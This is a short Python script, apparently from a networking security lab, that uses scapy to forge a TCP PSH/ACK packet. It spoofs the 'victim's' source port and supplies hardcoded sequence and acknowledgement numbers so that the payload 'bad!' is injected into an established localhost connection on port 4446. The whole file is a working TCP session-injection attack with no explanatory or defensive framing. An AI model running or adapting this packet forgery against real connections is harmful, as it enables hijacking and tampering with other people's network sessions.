import sys
import scapy3k.all as scapy
import socket
import struct


scapy.conf.L3socket
scapy.conf.L3socket=scapy.L3RawSocket

"""if len(sys.argv)<4:
	print("not enough arguments")
	print("src port of the victim, server port, seq number, ack number")

else:"""
# args to be sent to machineA
full_message =  "bad!"

# connection establishment
#Put the victim's port
sport = 42168
src=dest="127.0.0.1"
#Put the server port
dport=4446
ip=scapy.IP(src=src,dst=dest)
# put the seqence number and the ack of the previous ACK created by the previous messages.
PHACK=scapy.TCP(sport=sport,dport=dport,flags='PA',seq=1790383696,ack=1054105548)
scapy.send(ip/PHACK/full_message)





# to be nice, you should send the FIN/ACK, ACK pkts now ...
